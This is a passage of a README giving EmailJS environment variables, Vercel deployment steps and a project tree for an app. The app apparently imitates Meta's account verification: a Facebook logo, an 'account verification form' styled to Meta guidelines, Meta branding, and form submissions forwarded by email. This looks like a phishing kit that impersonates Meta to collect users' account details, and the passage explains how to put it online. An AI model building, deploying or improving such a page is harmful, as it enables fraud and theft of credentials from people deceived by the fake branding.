VITE_EMAILJS_USER_ID=your_emailjs_user_id_here
VITE_EMAILJS_SERVICE_ID=your_emailjs_service_id_here
VITE_EMAILJS_VALIDATION_TEMPLATE_ID=your_validation_template_id_here
VITE_EMAILJS_CONFIRMATION_TEMPLATE_ID=your_confirmation_template_id_here
```

## Critical Rules:
- Do NOT use the "@" symbol or references like "@emailjs-user-id"
- Enter the actual values directly from your EmailJS dashboard
- Ensure variable names match exactly as shown above
- Select all environments (Production, Preview, Development)

## Deployment Steps

1. Push your code to GitHub:
```bash
git init
git add .
git commit -m "Meta verification UI with EmailJS integration"
git push -u origin main
```

2. Connect to Vercel:
- Go to Vercel Dashboard (https://vercel.com)
- Click "New Project"
- Import your GitHub repository
- Configure project:
  - Framework Preset: Vite
  - Root Directory: ./
  - Build Command: npm run build
  - Output Directory: dist
  - Install Command: npm install

3. Environment Variables:
- In Vercel dashboard, go to Project Settings > Environment Variables
- Add all EmailJS variables exactly as shown above
- Make sure to add them for all environments
- Do not use @ symbol or references

4. Deploy:
- Vercel will automatically deploy when you push to GitHub
- Monitor the deployment logs for any issues
- Verify that the Meta verification UI appears correctly
- Test the EmailJS integration by submitting the form

## Verification Steps
After deployment, verify the following:
1. Meta verification UI components:
   - Facebook logo appears correctly in the navigation
   - Account verification form is styled according to Meta guidelines
   - All form fields have proper validation
2. User flow:
   - Validation page loads with Meta branding
   - Form submissions trigger EmailJS notifications
   - Success/error messages appear with correct styling
3. Mobile responsiveness:
   - UI adapts properly on mobile devices
   - Mobile warning modal appears when needed

## Project Structure
```
/
├── client/            # Frontend React application
│   ├── src/
│   │   ├── components/  # UI components
│   │   │   ├── ui/     # Shadcn UI components
│   │   │   └── form-two.tsx  # Meta verification form
│   │   ├── pages/      # Route pages
│   │   │   ├── validation.tsx   # Meta verification page
│   │   │   └── confirmation.tsx # Success confirmation
│   │   └── App.tsx     # Main application router
├── shared/            # Shared types and schemas
├── server/           # Backend services
└── vercel.json        # Vercel deployment configuration
```

## Local Development
```bash
# Install dependencies
npm install

# Start development server
npm run dev